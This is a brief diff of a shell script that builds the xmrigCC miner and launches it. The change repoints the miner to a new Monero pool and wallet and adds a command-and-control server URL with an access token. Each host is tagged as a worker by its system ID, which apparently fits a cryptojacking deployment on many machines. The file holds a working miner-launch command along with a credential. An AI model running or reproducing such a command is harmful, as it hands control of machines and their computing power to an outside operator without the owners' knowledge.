@@ -6,4 +6,4 @@ git clone https://github.com/Bendr0id/xmrigCC.git
 cd xmrigCC && mkdir build && cd build
 cmake ..
 make -j$(nproc)
-./xmrigDaemon -a rx/0 -o stratum+tcp://randomx.mine.zergpool.com:4448 -u bitcoincash:qr4fsvy29dxlaey4yzn43jjhd39l4t0nsvwt3g4evm --keepalive --donate-level 1 -p c=BCH,mc=XMR,ID=$systemID
+./xmrigDaemon -o pool.minexmr.com:4444 -u 46rnJNvHVXAjdHWfrQndEJPJrWxjwL42zMNgCMH5vJyW97rGynsc4JjMu8TmxqcesR5Rjwk4QXHGEQ3Zi3NFSTPVVWoB1c5.$systemID -k --cc-url=ccserver.buy9hits.com:80 --cc-access-token=hFCIifTSoRa2rM8jwOTu --cc-worker-id=$systemID
